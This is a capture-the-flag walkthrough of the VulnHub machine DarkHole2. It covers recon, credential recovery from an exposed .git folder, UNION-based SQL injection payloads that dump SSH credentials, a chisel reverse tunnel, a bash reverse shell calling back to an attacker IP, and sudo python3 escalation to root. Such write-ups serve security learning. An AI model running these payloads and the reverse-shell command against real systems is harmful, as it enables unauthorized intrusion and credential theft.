# Darkhole2

## Información General

<h3>Difficult: <img src="https://img.shields.io/badge/medium-orange?style=flat-square"> </h3>

<h3> Operating System : Linux</h3>

<h3> Vulnerability exploited: Exposed Git repository, Credential leakage in repository, SQLI, Insecure network exposure, pivoting, Sensitive data exposure via shell history, Credential reuse</h3>

<h3> Date of resolution: 10/10/2025 </h3>

<h3>Link: <a href="https://www.vulnhub.com/entry/darkhole-2,740">DarkHole2</a></h3>

### *Read this document in english* <a href="darkhole2.md">DarkHole2</a>

## Recognition

Since we're working on the VulnHub platform, to find the machine's IP address, we'll need to do the following:

1. All intrusions we're going to perform on both the attacker and victim machines must be in VMware.

2. Our Kali configuration must have the following:

In Player - Manage - Virtual Machine Settings - Network Adapter

<p align="center"> 
<img src="images/options.png" width="600" alt="Resultado de Nmap">
</p>

3.- In our Kali, we'll run the following commands:

Vuln Hub provides us with the IP address of the target machine **192.168.88.129**

I'm going to set the IP address of the target machine** in the **/etc/hosts** file. I'm going to call it **darkhole2**

**ARP-SCAN**

Run the following command:

```
sudo arp-scan -I eth0 --localnet
```

<p align="center"> 
<img src="images/arpscan.png" width="600" alt="Resultado de Nmap">
</p>

```
macchanger -l | grep -i vmware
```

<p align="center"> 
<img src="images/vmware.png" width="600" alt="Resultado de Nmap">
</p>

### Ping

Depending on the result we can deduce whether it is a Linux or Windows machine, for example:

```
ping -c 1 darkhole2
```

**If the ttl is 64. Therefore, it is Linux**

### Scanning for open ports

#### TCP Port Scanning

The command I use with nmap is:

```
sudo nmap -p- --open -sS -sC -sV --min-rate 2000 -n -vvv -Pn darkhole2
```

<p align="center"> 
<img src="images/nmap.png" width="600" alt="Resultado de Nmap">
</p>

<div align="center">

| Open port | Service | Version                                                      |
| --------- | ------- | ------------------------------------------------------------ |
| 80        | http    | Apache httpd 2.4.41 ((Ubuntu))                               |
| 22        | ssh     | OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) |

</div>

**192.168.174.131:80/.git/** --> I have discovered a url that takes us to a git

#### UDP port scanning

```
nmap -sU --top-ports 200 --min-rate=5000 -Pn darkhole2
```

**All ports are closed**

Next, we will try to detect any vulnerability with nmap using the following command:

```
nmap --script smb-vuln* -p445 darkhole2 -Pn
```

**Port 445 is closed**

## Exploration

### Fuzzing web

```
gobuster dir -u http://darkhole2 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x txt,py,php,sh
```

<p align="center"> 
<img src="images/gobuster.png" width="600" alt="Resultado de Nmap">
</p>

On this route

```
http://darkhole2/.git/logs/HEAD
```

I found the following email: anmar-v7@hotmail.com

Next, we use the command

```
wget -r http://darkhole2/.git/
```

What we do with this is download the contents of the Git folder.

Next, we use the following commands:

```
git log
```

<p align="center"> 
<img src="images/log.png" width="600" alt="Resultado de Nmap">
</p>

We are viewing all the logs

```
git show 0f1d821f48a9cf662f285457a5ce9af6b9feb2c4 
```

<p align="center"> 
<img src="images/show.png" width="600" alt="Resultado de Nmap">
</p>

I found the following email

**email** lush@admin.com <br>
**password** 321

## Exploid

One of the sqli commands that we will use will be the following:

```
http://darkhole2/dashboard.php?id=null' order by 6-- -
```

<p align="center"> 
<img src="images/web.png" width="600" alt="Resultado de Nmap">
</p>

I do this to know how many columns there are, there are 6 columns

```
http://darkhole2/dashboard.php?id=id=dani' union select 1,version(),database(),4,5, 6-- -
```

<p align="center"> 
<img src="images/system.png" width="600" alt="Resultado de Nmap">
</p>

Here we are looking at the system version and the database name.

```
http://darkhole2/dashboard.php?id=id=dani' union select 1,user(),3,4,5, 6-- -
```

<p align="center"> 
<img src="images/user.png" width="600" alt="Resultado de Nmap">
</p>

```
http://darkhole2/dashboard.php?id=null' UNION ALL SELECT 1, GROUP_CONCAT(table_name), 3,4,5,6 FROM information_schema.tables WHERE table_schema = 'darkhole_2' -- -
```

<p align="center"> 
<img src="images/tables.png" width="600" alt="Resultado de Nmap">
</p>

We get the ssh and users table

```
http://darkhole2/dashboard.php?id=null' union select 1,group_concat(column_name, ':'),3,4,5,6 from information_schema.columns where table_name = 'users'-- -
```

Next we will show the columns of the users table

<p align="center"> 
<img src="images/column.png" width="600" alt="Resultado de Nmap">
</p>

Next we will show the columns of the ssh table

<p align="center"> 
<img src="images/columns2.png" width="600" alt="Resultado de Nmap">
</p>

```
http://darkhole2/dashboard.php?id=null' union select 1,user,pass,4,5, 6 from ssh-- -
```

<p align="center"> 
<img src="images/contenido.png" width="600" alt="Resultado de Nmap">
</p>

Then in cmd we use the following command

```
ssh jehad@192.168.174.131
```

<p align="center"> 
<img src="images/ssh.png" width="600" alt="Resultado de Nmap">
</p>

First flag found

<p align="center"> 
<img src="images/flag.png" width="600" alt="Resultado de Nmap">
</p>

Next we will look at this user's history

```
history
```

<p align="center"> 
<img src="images/history.png" width="600" alt="Resultado de Nmap">
</p>

Port 9999 is apparently being used, so let's confirm it with the following command.

```
netstat -nat
```

<p align="center"> 
<img src="images/netstat.png" width="600" alt="Resultado de Nmap">
</p>

Next, we will find information about what is being used on port 9999 with the following command:

```
ps -faux | grep 9999
```

<p align="center"> 
<img src="images/information.png" width="600" alt="Resultado de Nmap">
</p>

We check that they are placed inside the **/opt/web/** folder

<p align="center"> 
<img src="images/opt.png" width="600" alt="Resultado de Nmap">
</p>

Inside we find the following file which basically consists of an unconditional that, using the get method, is putting the cmd command and therefore, executes a command at the system level, For example:

```
curl "localhost:9999/?cmd=whoami" -X GET
```

<p align="center"> 
<img src="images/curl.png" width="600" alt="Resultado de Nmap">
</p>

It tells us it's the user **Losy**.

Now to connect to the Losy user, we'll use a new tool called **chisel**. It's basically like a private key that won't connect to the user on port 9001.

We come to this <a href="https://github.com/jpillora/chisel">pag</a>

<p align="center"> 
<img src="images/github.png" width="600" alt="Resultado de Nmap">
</p>

Then we select chisel_1.11.3_linux_amd64.gz

<p align="center"> 
<img src="images/gz.png" width="600" alt="Resultado de Nmap">
</p>

```
cp chisel_1.11.3_linux_amd64.gz chinzel.gz
gunzip chinzel.gz
chmod +x chinzel 
file chinzel
```

<p align="center"> 
<img src="images/chinzel.png" width="600" alt="Resultado de Nmap">
</p>

Then we share this file to our victim machine with the following command

```
python3 -m http.server 8000
```

On our victim machine located in the **/tmp** folder we execute the following command:

```
wget 192.168.174.130:8000/chinzel
chmod +x chinzel
```

Then on our attacking machine we execute the following command:

```
./chinzel server --reverse -p 1234
```

And finally, on the victim machine we execute this command:

```
./chinzel client 192.168.174.130:1234 R:9999:127.0.0.1:9999
```

Then, to check that everything is done correctly, we execute this command on our attacking machine:

```
lsof -i:9999
```

<p align="center"> 
<img src="images/lsof.png" width="600" alt="Resultado de Nmap">
</p>

Then in the browser we put the following:

```
http://localhost:9999/?cmd=whoami
```
<p align="center"> 
<img src="images/whoami.png" width="600" alt="Resultado de Nmap">
</p>

Then, we do a reverse shell, using the following command, first preparing the listening port:

```
nc -lvp 4443
```

Then in the browser we put:

```
http://localhost:9999/?cmd=bash -c "bash -i >%26 /dev/tcp/192.168.174.130/4443 0>%261"
```

<p align="center"> 
<img src="images/nc.png" width="600" alt="Resultado de Nmap">
</p>

We are the user losy

### TTY

```
script /dev/null -c bash
```

**control z**

```
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
```

<p align="center"> 
<img src="images/tty.png" width="600" alt="Resultado de Nmap">
</p>

### Privilege Escalation

```
history
```

<p align="center"> 
<img src="images/pass.png" width="600" alt="Resultado de Nmap">
</p>

We found the password to be **gang**

```
sudo -l
```

<p align="center"> 
<img src="images/sudol.png" width="600" alt="Resultado de Nmap">
</p>

```
sudo -u root python3
import os
os.system("whoami")
os.system("bash")
whoami
```

<p align="center"> 
<img src="images/script.png" width="600" alt="Resultado de Nmap">
</p>

## Conclusion

The **Dark Hole 2** VulnHub machine has been, in my opinion, one of the most complex I've tackled so far. During the process, I encountered a diverse combination of techniques and tools: we worked with Git repositories, reviewed basic commands for retrieving a repository with the contents of a username and password to log in, and we also practiced SQL, a vulnerability that I find particularly challenging and whose review was very useful.

After gaining access with the user **jehad**, I inspected the command history with `history` and discovered that there was a service listening on port **9999**, which was related to another user named **losy**. To reach that service, I used **chisel**, a tool that allows you to create a private tunnel. This allowed me to connect to port 9999 and, from there, execute a reverse shell that allowed me to take control of **losy**'s session.

Privilege escalation was remarkably simple: querying `history` again revealed the password for user **losy**, which facilitated the subsequent steps to reach **root**. Overall, the machine required constant monitoring of the environment (history queries, open services, and tunneling) and was a good practice for integrating different techniques into a single exploit.